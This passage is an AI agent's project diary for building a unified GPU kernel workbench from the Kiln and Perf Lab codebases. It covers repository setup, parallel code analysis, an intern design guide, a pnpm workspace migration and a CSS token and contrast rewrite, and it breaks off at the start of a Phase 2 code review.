---
Title: Investigation diary
Ticket: KILN-001
Status: active
Topics:
    - kiln
    - perf-lab
    - gpu
    - compiler
    - evidence
    - frontend
    - design-system
DocType: reference
Intent: long-term
Owners: []
RelatedFiles:
    - Path: repo://ttmp/2026/10/19/KILN-001--kiln-x-perf-lab-unified-gpu-kernel-workbench-intern-analysis-design-and-implementation-guide/sources/01-perf-lab-language-and-frontend-notes.md
      Note: Reader 01 evidence notes
    - Path: repo://ttmp/2026/10/19/KILN-001--kiln-x-perf-lab-unified-gpu-kernel-workbench-intern-analysis-design-and-implementation-guide/sources/02-perf-lab-backend-notes.md
      Note: Reader 02 evidence notes
    - Path: repo://ttmp/2026/10/19/KILN-001--kiln-x-perf-lab-unified-gpu-kernel-workbench-intern-analysis-design-and-implementation-guide/sources/03-kiln-compiler-runtime-notes.md
      Note: Reader 03 evidence notes
    - Path: repo://ttmp/2026/10/19/KILN-001--kiln-x-perf-lab-unified-gpu-kernel-workbench-intern-analysis-design-and-implementation-guide/sources/04-kiln-ui-and-design-system-notes.md
      Note: Reader 04 evidence notes
ExternalSources: []
Summary: 'Chronological diary for KILN-001: repository creation, analysis of Kiln and Perf Lab, the intern guide, and the implementation of the unified workbench.'
LastUpdated: 2026-10-19T13:37:36.839842-04:00
WhatFor: ""
WhenToUse: ""
---

# Investigation diary

## Goal

Record, in order, how the KILN-001 repository, analysis and implementation were produced: what was run, what
worked, what failed with exact diagnostics, and why each decision was taken. Subagents keep their own diaries
under `sources/` and are linked from the step that launched them.

## Step 1: Create the repository and import both projects

The first request was to start a fresh repository, copy Perf Lab (the ML-PERF-001 `lab-workbench`) verbatim,
import the Kiln Workbench source zip and the comparison memo, initialize docmgr and open a ticket. The copy
initially failed because the boot volume was full; at the user's direction the whole repository now lives on
`/Volumes/SSD/code/kiln`, with `~/code/tulip/experiments/kiln` as a symlink, and the copy is byte-identical to its
source.

### Prompt Context

**User prompt (verbatim):** "Working on ttmp/2026/10/12/ML-PERF-001--dino-and-embedding-kernel-profiling-and-visualization/experiments/l
 ab-workbench 

. 

Create a new separate repo in ~/code/tulip/experiments/kiln where you can cp all that verbatim and then also import the source from @~/Downloads/kiln-workbench-src.zip and ~/Downloads/Untitled.md and then analyze everything closely and make a new docmgr ticket in the new repo (docmgr init --root ttmp --seed-vocabulary before hand) and Create a detailed analysis / design / implementation guide that is for a new intern, explaining all the parts of the system needed to understand what it is, with prose paragraphs and bullet points and pseudocode and diagrams and api references and file references. It should be very clear and technical. Store in the ticket and upload to remarkable.

In order to create the full system. Use the look from kiln / typography adn stuff preferrably."

Follow-up messages during the step (verbatim): "you can move stuff to /Volumes/SSD" and "you can put the entire
repo in there I think".

Later request (verbatim, received after Step 1's work): "Once upload, then implement it, btw commit at appropriate intervals and keep a detailed diary as you work
    (using the diary format from the skill). Diary is important, and tell subagents to write their own as they work as well. 

Take screenshots as you go for the diary and for reports. After significant milestones, write a report for the vault. (Instructions: Write a detailed project report for the obsidian vault in ~/code/tulip/playback-vault (instead of go-go-parc) as a deep dive technical analysis blog post using a textbook writing style (no analogies, see skill). Commit and push the playback-vault when done.)"

**Assistant interpretation:** Build a new repository holding both workbenches as received, write an intern-level
guide for a unified system that keeps Kiln's visual language, deliver it to reMarkable, then implement that system
with commits, a detailed diary, screenshots and vault reports at milestones.

**Inferred user intent:** Merge Kiln's kernel compiler and cost model with Perf Lab's evidence discipline into one
workbench, with documentation good enough that an intern can follow and extend it.

**Commit (code):** see Step 2 (initial import commit).

### What I did

- Inspected the source: `lab-workbench` is 1.4 GB, of which `node_modules` is 448 MB and `workloads/.venv` 896 MB.
- `mkdir -p ~/code/tulip/experiments/kiln/imports && cp -a <lab-workbench> ~/code/tulip/experiments/kiln/lab-workbench`
  failed part-way (see below); removed the partial copy.
- Copied without the two dependency trees (`rsync -a --exclude node_modules --exclude workloads/.venv`), then, after
  the user pointed at the SSD, copied those trees to `/Volumes/SSD` and finally moved the whole repository to
  `/Volumes/SSD/code/kiln` with real (not symlinked) dependency directories, replacing
  `~/code/tulip/experiments/kiln` with a symlink.
- Unzipped `~/Downloads/kiln-workbench-src.zip` into `imports/kiln-workbench-src/` (125 entries, 3.2 MB), copied
  `Untitled.md` to `imports/Untitled.md`, and kept the zip in `imports/` for provenance.
- `git init`; `docmgr init --root ttmp --seed-vocabulary`; added seven topic slugs (`kiln`, `perf-lab`, `gpu`,
  `compiler`, `evidence`, `frontend`, `design-system`); `docmgr ticket create-ticket --ticket KILN-001 …`; added the
  design-doc and this diary; added tasks.
- Wrote a repository `README.md` and a root `.gitignore`.

### Why

- A symlinked home path keeps the location the user asked for while the bytes live on the volume with space.
- The zip is kept next to its extraction so the import can be re-verified by hash.

### What worked

- `diff -rq --no-dereference <source lab-workbench> /Volumes/SSD/code/kiln/lab-workbench` printed nothing
  (`IDENTICAL`): the final copy matches the source, including `.data/`, `dist/`, `node_modules/` and `.venv/`.
- Hashes: `kiln-workbench-src.zip` sha256 `d5bc074bcd5d0dcac853d6c7f81490ae35ebdac26feded18b9a769dc3001e7b1`
  (same as `~/Downloads`), `Untitled.md` sha256 `7ebd0287988983908a2d18ba17157d8e4814a108af2df466358121858fc0840a`.
- Source revision of the copied Perf Lab: playback worktree `docs/ml-perf-001-perf-explorer` at
  `cdb84891ca97f33b30b46c27acbc71a1dc7b2dad`.

### What didn't work

- The first `cp -a` filled the boot volume:
  `cp: /Users/manuel.odendahl/code/tulip/experiments/kiln/lab-workbench/workloads/.venv/lib/python3.12/site-packages/torch/lib/libtorch_cpu.dylib: fcopyfile failed: No space left on device`
  followed by hundreds of the same error and `zsh:1: no space left on device: /tmp/claude-9788-cwd`.
  `df` then showed 2.3 GiB free on `/System/Volumes/Data` (460 GiB volume, 100% used). Recovery: removed the partial
  copy; moved everything to `/Volumes/SSD` (1.5 TiB free).
- The first `rm -rf` after the failure itself failed with `ENOSPC` because the tool could not create its output file
  in `/private/tmp`; repeating the command succeeded.

### What I learned

- The boot volume has about 2 GB of headroom; anything large (dependency trees, model weights, build outputs,
  screenshots in bulk) must go to `/Volumes/SSD`.
- Perf Lab's own `.gitignore` already excludes `node_modules`, `dist`, `*.tsbuildinfo`, `.data/` and
  `workloads/.venv/`, so those are present on disk but untracked.

### What was tricky to build

- Ordering: the home path had to be removed before the symlink could take its name, and the diff had to use
  `--no-dereference` while the dependency trees were still symlinks.

### What warrants a second pair of eyes

- `imports/kiln-workbench-src/kiln-workbench/app/dist/*.html` and `runner/kiln-workbench.html` are ~740 KB built
  bundles committed as received; they are third-party build output, not reviewed line by line.

### What should be done in the future

- N/A for this step.

### Code review instructions

- `ls -la ~/code/tulip/experiments/kiln` (symlink), `README.md`, `imports/`, `ttmp/2026/10/19/KILN-001--*/`.

### Technical details

- Analysis is split across four subagents, each writing notes to `sources/0N-*.md`:
  01 Perf Lab language and frontend, 02 Perf Lab backend and workloads, 03 Kiln compiler/runtime/agent/runner,
  04 Kiln UI and design system.

## Step 2: Analyse both systems with four parallel readers

The analysis was split by subsystem so that each reader could go deep and cite line numbers: two readers for Perf
Lab (language and frontend; backend and workloads) and two for Kiln (compiler and runtime; UI and design system).
Each wrote a long evidence note and its own diary in `sources/`, tagging every claim observed or inferred. All four
finished; the notes total 5,288 lines and are the evidence base of the intern guide.

### Prompt Context

**User prompt (verbatim):** see Step 1.

**Assistant interpretation:** "Analyze everything closely" means reading every source file of both systems, running
their tests where safe, and verifying the comparison memo's claims, before designing anything.

**Inferred user intent:** The guide must be trustworthy enough for an intern to build on, so its claims need file
and line evidence.

**Commit (code):** pending (committed with Step 3).

### What I did

- Launched four subagents, each told to write notes to `sources/0N-<topic>-notes.md`, keep its own diary at
  `sources/0N-<topic>-diary.md` in the investigation format, never write into `lab-workbench/` or `imports/`, and
  use `/Volumes/SSD` for scratch:
  - [01 Perf Lab language and frontend](../sources/01-perf-lab-language-and-frontend-diary.md)
  - [02 Perf Lab backend and workloads](../sources/02-perf-lab-backend-diary.md)
  - [03 Kiln compiler, runtime, agent, runner](../sources/03-kiln-compiler-runtime-diary.md)
  - [04 Kiln UI and design system](../sources/04-kiln-ui-and-design-system-diary.md)
- Read all four notes in full and checked the claims I relied on against the source (for example
  `K/app/src/std/store.js` and `programOf` in `K/app/src/std/program.js`, both quoted in the guide).

### Why

- Four readers in parallel cover 7,100 lines of Kiln and about 9,000 lines of Perf Lab TypeScript and Python in
  the time one reader would need for one subsystem, and the split keeps each note focused.

### What worked

- Perf Lab builds and tests green in this copy: `tsc --noEmit` passes, Vitest 11 files / 104 tests (note 02 §11,
  note 01 §10). The memo's claim that `features/build/` is missing is false here.
- The memo's numbers reproduce exactly from `lab-workbench/.data/perf-lab.sqlite` (read-only): 2.50× (2.37–2.72) and
  2.29× (1.88–2.52); with four processes each interval equals the min–max of four ratios (note 02 §8.5).
- Kiln's headless tests pass on a scratch copy (`/Volumes/SSD/code/kiln-scratch`): core, stack1-3, progs, tune,
  presets 25/25, notes 169 `lab:` links, param-sweep 227 compiles in 55.2 s (note 03 §8.3).
- Eight screenshots of Kiln (light, dark, perf, trace, graph, knobs, phone) and Perf Lab were rendered with headless
  Chrome into `sources/screens/` (note 04 Appendix A).

### What didn't work

- Reader 03, in the scratch copy: `npm ci --offline --ignore-scripts --no-audit --no-fund` failed with
  `npm error code ENOTCACHED` / `request to https://registry.npmjs.org/katex/-/katex-0.16.9.tgz failed: cache mode is 'only-if-cached' but no cached response is available.`
  It installed `acorn@8` alone (resolved 8.18.0, lockfile pins 8.19.0) in a separate scratch directory, which is
  all the headless tests need.
- Reader 04: Chrome printed `CVDisplayLinkCreateWithCGDisplay failed. CVReturn: -6670` on every run (harmless);
  `kiln-trace-light-1600.png` shows a stale header (W-18) over W-09 content, a capture artifact of driving the store
  from a parent frame, not investigated.
- Reader 01: zsh glob-expanded an unquoted `--include=*.ts` (`(eval):1: no matches found: --include=*.ts`); BSD
  sed rejected `sed -n 330,639` (`sed: 1: "330,639": command expected`).
- Not run anywhere: Kiln's Playwright UI test, NVRTC/ptxas checks and the CUDA runner (no NVIDIA GPU here), Perf
  Lab's Python workloads.

### What I learned

- The two systems are complementary at the level of mechanisms, not just features: Kiln's weakest point is how far
  a number can be trusted (one best row, constant device ids, simulator timed by the model's formula), which is
  exactly what Perf Lab's evidence contract addresses; Perf Lab's weakest point is that it has no model and cannot
  generate variants, which is Kiln's core.
- Both run model-written code in the page with `new Function`/`new AsyncFunction`, and both servers trust the
  page; Perf Lab trusts a client-supplied `proposedBy` for job approval (`server/app.ts:160, 172`).
- Kiln's look is fully token-driven but has hazards (`.gutter` collision, duplicate `.dtabs`, ~120 dead classes,
  comment contrast 2.44:1, no reduced-motion handling).

### What was tricky to build

- Keeping the readers from writing into the imported trees: Perf Lab's `pnpm typecheck` writes `tsbuildinfo`, so
  reader 02 avoided it; reader 03 worked on a scratch copy.

### What warrants a second pair of eyes

- Inferred security findings (cross-site POSTs to Perf Lab's server, DNS rebinding against `kiln_runner.py serve`)
  were not exploited, only derived from code; they drive design decisions D9-D11.

### What should be done in the future

- Kiln's Playwright UI test and the WebGPU path should be run once the workbench is moved (Phase 0/3).

### Code review instructions

- Start with note 03 §10 and note 02 §10 (weaknesses), then note 04 §6.3 (token proposal).

### Technical details

- Scratch locations: `/Volumes/SSD/code/kiln-scratch` (reader 03), `/Volumes/SSD/tmp/kiln-001-04-scratch/harness/drive.html`
  (reader 04; Chrome with `--allow-file-access-from-files` and a fresh `--user-data-dir`).

## Step 3: Write the intern guide

With the evidence in place I wrote the guide in six parts: orientation and vocabulary, Kiln as it is, Perf Lab as it
is, the weaknesses of each (K-1 to K-18, P-1 to P-16), the unified design, and a phased implementation plan. The
design is concrete enough to implement from: record schema, hashing rules, the interval-based evidence policy, the
verdict function, server API and security checks, and the visual tokens.

### Prompt Context

**User prompt (verbatim):** see Step 1.

**Assistant interpretation:** One long design document that teaches both systems and specifies the unified one,
with prose, bullets, pseudocode, diagrams, API tables and file references, in Kiln's visual vocabulary.

**Inferred user intent:** The guide is the build plan the implementation will follow next, and an onboarding text.

**Commit (code):** see the commit after this step.

### What I did

- Wrote `design-doc/01-kiln-x-perf-lab-intern-guide-to-the-unified-gpu-kernel-workbench.md` (about 1,960 lines):
  Parts 0-VI plus three appendices.
- Fixed two section cross-references after writing (`§15` → `§17` for the K weaknesses).

### Why

- The design decisions (D1-D13) are recorded with alternatives because several of them (agent sandbox, server-side
  approval, interval-based evidence) change behaviour users of both systems rely on.

### What worked

- Every weakness in Part IV carries a file reference from the notes; every design section names the weaknesses it
  fixes.

### What didn't work

- The first `Write` of the guide was refused with `File has not been read yet. Read it first before writing to it.`
  because the docmgr template already existed; I read it and wrote again.

### What I learned

- The cleanest unification point is the *record*: once a measurement is a content-addressed record with samples,
  provenance and validity, the evidence policy, hypotheses, the server and the UI all follow from it.

### What was tricky to build

- Mapping Kiln's sources onto Perf Lab's provenance classes: the simulator's counts are exact for the sampled blocks
  but its time is the model's formula, so the design labels simulator counts `derived` and simulator time
  `heuristic` (§24 of the guide).

### What warrants a second pair of eyes

- The verdict rule "a row with missing inputs can neither support nor refute" (guide §29.3) is stricter than Perf
  Lab's and changes some verdicts from refuted to open.
- The policy's `minReps = 3` default for real devices.

### What should be done in the future

- Update the guide whenever an implementation phase deviates from it, and say so in the diary.

### Code review instructions

- Read guide §20-§29 (design) and §35 (phases) first; the rest is reference.

### Technical details

- Unified server port chosen as 5280 to avoid Perf Lab's 5198/5199.

## Step 4: Phase 0 — workspace and move

Phase 0 of the guide (§35) moves Kiln out of `imports/` into a pnpm workspace without changing behaviour: the
compiler becomes `@kiln/kiln` (`packages/kiln`), the page becomes `@kiln/workbench` (`apps/workbench`), and React,
ReactDOM and KaTeX are bundled from npm so the built page needs no network. The built page renders the same default
layout as the reference capture, and every Kiln test that ran before still passes.

I also wrote two scripts the later phases depend on: `scripts/run-node-tests.mjs`, which runs Kiln's script-style
tests and fails on a non-zero exit, and `scripts/shoot.mjs`, which drives headless Chrome over the DevTools protocol
(throwaway profile, ready condition, in-page steps, screenshot) and replaces the hand-run Chrome commands and iframe
harness the UI reader used in sources/04 Step 6.

### Prompt Context

**User prompt (verbatim):** see Step 1 (the "Once upload, then implement it…" request).

**Assistant interpretation:** Start implementing the guide's phases in order, committing at milestones, with a
detailed diary and screenshots.

**Inferred user intent:** A working unified workbench, built in verifiable steps that someone can review.

**Commit (code):** see the commit after this step ("KILN-001 Phase 0: pnpm workspace; …").

### What I did

- Workspace root: `package.json` (scripts `build`, `test`, `shoot`; `packageManager: pnpm@12.4.1`),
  `pnpm-workspace.yaml` (`packages/*`, `apps/*`, `allowBuilds: {esbuild: true}`), `tsconfig.base.json` (strict,
  `erasableSyntaxOnly`, `verbatimModuleSyntax`, `noEmit`; first used in Phase 2).
- `packages/kiln/`: `cp -R` of `K/app/src/core` and `K/app/src/std`; tests `core`, `progs`, `stack1-3`, `tune`
  (their `../src/...` imports still resolve, so they are byte-identical to the originals). `package.json` exports
  `./core/*` and `./std/*`; the only dependency is `acorn@8.19.0` (used by `core/script.js`; `acorn-walk` from
  Kiln's manifest is never imported, so it was dropped).
- `apps/workbench/`: `src/ui`, `src/agent`, `src/main.jsx`, `build.mjs`, `presets/`, `reference.txt`,
  `agent-guidelines.txt`, tests `export-cuda`, `notes`, `param-sweep`, `presets`, `ui` and `cuda_check.py`.
  Every `../core/` and `../std/` import in `src/ui` and `src/agent` (and `./core/`, `./std/` in `main.jsx`, and
  `../src/core|std/` in the moved tests) became `@kiln/kiln/core/…` / `@kiln/kiln/std/…`, by `sed`.
- `build.mjs`: paths now relative to `apps/workbench/` (presets, docs) and `../../runner/kiln_runner.py`; removed the
  `umd-globals` esbuild plugin and the three cdnjs `<script>` tags. `main.jsx` imports `katex` and sets
  `window.katex`, which `ui/doc.js` already reads; `doc.js`'s header comment updated. `test/ui.mjs` lost its
  `ctx.route("https://cdnjs…")` block, which served the UMD files from `node_modules` and is now dead.
- `runner/kiln_runner.py`: copied unchanged.
- `.gitignore`: `dist/`, `apps/workbench/src/*.gen.js`, `.data/`.
- `scripts/run-node-tests.mjs <dir> [--skip f]... [--verbose]`, and `scripts/shoot.mjs <url|file> <out.png>
  [--size WxH] [--dark] [--until EXPR] [--do JS]... [--settle MS] [--webgpu] [--print EXPR]`, also usable as a
  module (`withPage(opts, fn)`).
- README: layout and run commands.
- Screenshot: `various/screens/p0-default-light-1600.png`.

### Why

- `@kiln/kiln` uses package `exports` with `./core/*` and `./std/*` subpaths rather than a single barrel, so the
  UI's imports change by prefix only and `diff -r` against `imports/` stays readable.
- KaTeX goes through `window.katex` rather than an import inside `doc.js`, so the Node tests keep rendering TeX as
  source exactly as before (Phase 0 changes no behaviour).
- `param-sweep.mjs` takes 54 s; it moved to `pnpm --filter @kiln/workbench test:sweep` so `pnpm test` stays under
  15 s. `export-cuda.mjs` is an export tool (it writes `/tmp/kiln-kernels.json` for `cuda_check.py`), and `ui.mjs`
  needs Playwright, which is not installed here; both are skipped by `pnpm test`.
- A CDP script instead of Playwright: Chrome is installed, Node 26 has a global `WebSocket`, and the later WebGPU
  protocol needs the same driver. No new dependency.

### What worked

- `pnpm build` → `dist/index.html 1137 KB (bundle 1057 KB, 25 presets, 25 with notes)`; `grep -c cdnjs` on the
  standalone page returns 0.
- `pnpm test`: `core 62 ms, progs 327 ms, stack1 100 ms, stack2 692 ms, stack3 237 ms, tune 1167 ms` (all 6 passed);
  `notes 2711 ms, presets 7608 ms` and, before it moved, `param-sweep 54251 ms`. Run directly, `notes.mjs` prints
  `all notes pass (169 lab links)` and `presets.mjs` prints `all presets pass`, as in sources/03.
- `diff -r` against `imports/`: `core`, `std`, `presets` and `kiln_runner.py` are identical; the UI and agent
  files differ only in the import prefixes, plus the `doc.js` comment.
- `shoot.mjs` on the standalone page printed `{ready: true, preset: "W-18", katex: true, react: "undefined",
  math: 43}`: React is no longer a global, KaTeX rendered 43 MathML elements, and `pgrep -f kiln-shoot-` found no
  leftover Chrome. The capture matches `sources/screens/kiln-default-light-1600.png` except the compile time
  (18 ms vs 17 ms).

### What didn't work

- `pnpm install` with `onlyBuiltDependencies: [esbuild]` (the setting `lab-workbench/` uses) failed under pnpm
  12.4.1: `Error: ERR_PNPM_IGNORED_BUILDS … Ignored build scripts: esbuild@0.24.2 … Run "pnpm approve-builds"`.
  pnpm then rewrote `pnpm-workspace.yaml` itself, dropping `onlyBuiltDependencies` and appending
  `allowBuilds:\n  esbuild: set this to true or false`. My edit added a second `allowBuilds` key, and the next
  install failed with `duplicate mapping key: allowBuilds`. Writing the file once with `allowBuilds: {esbuild:
  true}` fixed it; esbuild's postinstall ran.

### What I learned

- pnpm 12 replaced `onlyBuiltDependencies` with an `allowBuilds` map and edits `pnpm-workspace.yaml` in place when
  it finds a blocked build.
- The page is 1.1 MB once React and KaTeX are inside; the original page was smaller but needed three CDN fetches.

### What was tricky to build

- `shoot.mjs` must not leak Chrome processes or touch the real profile. It starts Chrome with
  `--remote-debugging-port=0` and a `mkdtemp` profile, reads the port from `<profile>/DevToolsActivePort`, connects
  to the page target from `/json/list`, and in `finally` sends SIGTERM, waits for `exit` and removes the profile. A
  hard `SIGKILL` timer bounds the whole run.

### What warrants a second pair of eyes

- `allowBuilds` is pnpm-12-specific; with an older pnpm the workspace file would be read differently.

### What should be done in the future

- Port `test/ui.mjs` from Playwright to `scripts/shoot.mjs` so the browser checks run on this machine.

### Code review instructions

- `diff -r imports/kiln-workbench-src/kiln-workbench/app/src/ui apps/workbench/src/ui` shows the whole UI change.
- `pnpm install && pnpm build && pnpm test`; then `node scripts/shoot.mjs apps/workbench/dist/kiln-workbench.html
  /tmp/p0.png`.

### Technical details

- Test ownership: `packages/kiln/test` holds tests that import only `core`/`std`; tests that import `ui/wb.js`
  (`notes`, `presets`, `param-sweep`, `export-cuda`) or the built page (`ui`) live in `apps/workbench/test` and need
  `node build.mjs --gen-only` first, which the `test` script runs.

## Step 5: Phase 1 — the visual language

Phase 1 (§32, §35) replaces the three inherited stylesheets (`forge-base.css` 283 lines, `lab.css` 527, `kiln.css`
234) with six files, split by concern and loaded in a fixed order: `tokens.css` (44), `base.css` (166),
`chrome.css` (126), `views.css` (364), `evidence.css` (47) and `utilities.css` (6) — 753 lines in all. The page
looks the same, apart from three deliberate changes. The editor gutter is no longer grey. Secondary text is slightly
darker. The new evidence marks (provenance, value cells, stamps, the title block, chart series) exist as styles and
appear on a specimen page; Phase 3 puts them into the views.

Two problems came out of the rewrite and were fixed here rather than deferred. The guide's token values fail WCAG
in eight places; the values were adjusted until `scripts/contrast.mjs` passes, and the guide's table is now wrong
where noted below. The Perf view also had a real subscription race in `useLab`, which the new build made
deterministic.

### Prompt Context

**User prompt (verbatim):** see Step 1 (the "Once upload, then implement it…" request).

**Assistant interpretation:** Phase 1 of the guide: unified tokens, the hazards listed in §32.1, and the evidence
marks of §32.3–32.5, with screenshots.

**Inferred user intent:** A single visual system the later evidence features can draw into, without a visible
regression in what works today.

**Commit (code):** see the commit after this step ("KILN-001 Phase 1: …").

### What I did

- `tokens.css`: every token from §32.1, with the dark values written twice — once under
  `@media (prefers-color-scheme: dark) :root:not([data-theme="light"])` and once under `:root[data-theme="dark"]` —
  so the system preference and the explicit toggle both work. It also holds `@keyframes bl` and the
  `prefers-reduced-motion` block, which sets `--blink: none` and turns off the drop-hint transition.
- `base.css` (reset, controls, menus, the view frame, tables, code, toasts), `chrome.css` (header, dock, phone
  strip, container and media queries), `views.css` (one section per view), `evidence.css` (new marks),
  `utilities.css` (`.bad`, `.ok`, `.dim`, `.padded`).
- `build.mjs` concatenates the files in that order:
  `["tokens", "base", "chrome", "views", "evidence", "utilities"]`.
- Hazards from §32.1:
  - The `.gutter` collision is fixed by renaming to `.dock-gutter` (`Dock.jsx:93`) and `.ed-gutter` /
    `.ed-gutter-in` / `.ed-code` (`Ide.jsx`).
  - The duplicate `.dtabs` and `.prow` rules are merged into one each.
  - Rules whose classes no file uses are deleted; `--mono`, which held Arial, is renamed `--sans`.
  - Every animation reads `var(--blink)`.
- Three scripts:
  - `scripts/css-usage.mjs [--write] <css...> -- <sources...>` lists selectors whose classes or ids appear in no
    source file.
  - `scripts/contrast.mjs [tokens.css]` checks every text/ground pair at 4.5:1 and input borders at 3:1, in light
    and dark, compositing `--sel` over `--bg` first.
  - `scripts/shoot-views.mjs <page> <out-dir> [prefix] [--only names]` captures eight fixed scenes: default
    light/dark, Perf after a measure, Trace, Knobs, Graph after a 16-program tune, and phone light/dark at 390 px.
- `scripts/specimen.mjs [out.html]` writes `dist/specimen.html`: the tokens, every provenance mark, value cells,
  stamps, a title block, the three chart series and a stale block, styled by the real stylesheets.
- `common.jsx`: `useLab` rewritten on `useSyncExternalStore` (see What didn't work).
- Screenshots in `various/screens/`:
  - `p1-before-perf-light-1600.png` (Phase 0 build, grey gutter)
  - `p1-perf-light-1600.png`, `p1-default-light-1600.png`, `p1-default-dark-1600.png`, `p1-phone-390.png`
  - `p1-specimen-light.png`, `p1-specimen-dark.png`

### Why

- Splitting by concern rather than by origin (Forge, Octavo, Kiln) means a later phase edits one file: the evidence
  views in Phase 3 touch `evidence.css` and `views.css`, and never the dock.
- `utilities.css` loads last because a utility must beat the component rule it is combined with. `.empty.padded`
  lost its padding when `.padded` was emitted before `.empty`; specificity is equal, so only order decides.
- The evidence marks are styled before any view uses them so Phase 3 changes only markup. The specimen page is how
  they get reviewed before then.

### What worked

- `node scripts/contrast.mjs` → `all pairs pass`; tightest pairs: light `accent on sel 4.53:1`,
  `ink-2 on sel 4.67:1`, `hair-strong on code-bg 3.13:1`; dark `accent on sel 4.55:1`,
  `on-accent on accent 4.95:1`.
- `pnpm test`: `@kiln/evidence` 8 files / 110 tests; `core 54 ms, progs 317, stack1 107, stack2 682, stack3 243,
  tune 1174` (6 passed); `notes 2755 ms, presets 7312 ms` (2 passed).
- `pnpm build` → `dist/index.html 1113 KB (bundle 1057 KB, 25 presets, 25 with notes)` — 24 KB less CSS than
  Phase 0's 1137 KB.
- `css-usage` reports 25 unused selectors, all in `evidence.css` (`.prov.*`, `.val.*`, `.stamp.*`, `.titleblock`,
  `.ser .*`), which no view uses until Phase 3. The other five files have none.
- All eight `shoot-views` captures are `ok`. Compared with the Phase 0 captures:
  - Knobs, Trace and Graph are pixel-equivalent except for timestamps.
  - Perf and the default layout differ only in the white editor gutter and the slightly darker secondary text.
  - Phone at 390 px shows the strip, toolbar and IR without horizontal clipping.

### What didn't work

- **Guide token values fail contrast.** `contrast.mjs` on the §32.1 values (`--ink-2 #737373`, `--hair-strong
  #949494`, `--sel` alpha .10 light / .16 dark, white text on the accent) reported:

  ```text
  light  FAIL ink-2 on fill 4.39:1   FAIL tok-com on fill 4.39:1   FAIL tok-punc on fill 4.39:1
         FAIL accent on sel 4.14:1   FAIL ink-2 on sel 3.97:1      FAIL hair-strong on code-bg 2.93:1
  dark   FAIL accent on sel 4.18:1   FAIL on-accent on accent 3.51:1
  ```

  Changes:
  - `--ink-2` (and `--tok-com`, `--tok-punc`) `#6e6e6e`.
  - `--hair-strong #8f8f8f`.
  - `--sel` alpha 0.05 light / 0.09 dark; the wash is fainter and still visible on selected rows and call-outs.
  - New `--on-accent` token (`#ffffff` light, `#1a1a1a` dark) for text on a red fill (`.toast.bad`), because white
    on `#ff3b4a` is 3.51:1.
- **Perf showed "Measure to run…" after a completed measure.** With the new CSS build, `shoot-views` perf
  reproducibly showed the empty state although `window.__kiln.wb.measures` held the result. The cause was
  `useLab`:
  - It subscribed in `useEffect`, after render.
  - A `bump("measure")` that fired between the render and the effect was lost, so the view stayed on its first
    render.
  - The old build happened to schedule the effect sooner, so the race was rare.

  `useSyncExternalStore(subscribe, () => versions.join(","))` re-reads the channel versions after subscribing,
  so no bump is lost. After the fix the perf capture shows `76.7 µs` and no `.empty` element.
- **One visible change from deleting Octavo rules.** The standalone `.ask` rule (`lab.css:268`: accent border,
  `padding: 8px 10px`, `display: flex`, column, 8 px gap) belonged to Octavo's approval box. It also matched the
  agent's waiting step, `<details class="tool ask">`, because the step's status is used as a class. With the rule
  gone, a waiting step keeps its own `details.tool.ask` rules (red border, blinking red dot, red "waiting for you")
  and loses the extra padding and the flex layout on `<details>`. It is now the same size as every other step. I
  kept that change rather than restoring the rule.
- In the specimen, `#half` defined as an 8 px `userSpaceOnUse` pattern filled each simulator marker differently
  depending on its x position. An `objectBoundingBox` pattern (`patternContentUnits="objectBoundingBox"`, a 0.5-wide
  ink rect over a bg rect) half-fills every marker. Phase 3's charts must define it that way.

### What I learned

- In this page, CSS order is the only tiebreaker between a component class and a utility class: neither uses ids or
  `!important`. That is why the order is written in `build.mjs` with a comment.
- A dead-selector check needs to know the casing conventions of generated markup: `doc.js` lowercases callout kinds
  from the Markdown, so `.caveat` and `.exercise` look dead to a case-sensitive search.

### What was tricky to build

- `css-usage.mjs` balances false positives against false negatives:
  - A class counts as used if its name appears as a word anywhere in the sources, case-insensitively, hyphen parts
    included, because class names are often built from strings (`cls("dock-gutter", node.dir)`).
  - Ids count only as `id=`, `getElementById` or `"#x"`, because short id words appear in prose.
  - `:not(...)` arguments are ignored.

### What warrants a second pair of eyes

- The `--sel` alpha halved in light mode. Selected rows are still distinguishable in the captures, but on a
  low-quality panel the wash may be too faint; the selection also carries a 2 px red left bar, which does not depend
  on the wash.
- `useLab` now re-renders on any bump of any listed channel, as before, but through React's external-store path. A
  component that passes a different channel list on each render would re-subscribe each time; all current callers
  pass constants.

### What should be done in the future

- Update the guide's §32.1 table with the shipped values (`#6e6e6e`, `#8f8f8f`, alphas 0.05/0.09, `--on-accent`).
- Phone at 320 px is untested.
- The Knobs option table cuts its last column (`pin +`) at 1600 px in a three-column layout — present in Phase 0
  as well.
- Roofline point labels overlap when two kernels sit close together (Perf, W-09). Both of these belong to Phase 3,
  which rebuilds those views.

### Code review instructions

- `git show --stat HEAD` for the file list. Start with `tokens.css` and `evidence.css`; `base.css`, `chrome.css`
  and `views.css` are a reorganisation of the deleted files.
- Checks: `node scripts/contrast.mjs`; `cd apps/workbench && node ../../scripts/css-usage.mjs src/ui/*.css -- src
  ../../packages/kiln/src presets build.mjs`; `pnpm build && node scripts/shoot-views.mjs
  apps/workbench/dist/kiln-workbench.html /tmp/p1`; `node scripts/specimen.mjs`.

### Technical details

- Contrast compositing: `over(fg, bg) = fg·α + bg·(1−α)` per channel, then WCAG relative luminance and
  `(L1 + 0.05) / (L2 + 0.05)`.
- `useLab`:

  ```js
  export function useLab(...chs) {
    const key = chs.join(",");
    const subscribe = useCallback((cb) => { const offs = chs.map((c) => lab.on(c, cb)); return () => offs.forEach((f) => f()); }, [key]);
    useSyncExternalStore(subscribe, () => chs.map((c) => lab.version(c)).join(","));
    return lab;
  }
  ```

## Step 6: Phase 2 — review and commit `@kiln/evidence`

A forked agent wrote `packages/evidence` while I worked on Phase 1; its own diary is `reference/02-phase2-evidence-diary.md`
(Steps 1–4). This step is my review before committing it. I read all seven modules
(values, stats, sha256, canonical, identity, record, verdict; 843 lines). The design matches the guide, and the
fork listed its deviations in its Step 4. I found one defect in `verdict`, fixed it, and updated the guide wherever
Phases 1 and 2 departed from it.

### Prompt Context

**User prompt (verbatim):** see Step 1 (the "Once upload, then implement it…" request; "tell subagents to write
their own [diaries]").

**Assistant interpretation:** Review the subagent's package, fix what is wrong, record it in both diaries, commit.

**Inferred user intent:** The evidence rules — the base of every later phase — should be correct before Phase 3
builds on them.

**Commit (code):** see the commit after this step ("KILN-001 Phase 2: …").

### What I did

- Ran `pnpm --filter @kiln/evidence typecheck` (clean) and `test` (8 files, 110 tests).
- Probed the negative-predicate rule one level down:

  ```text
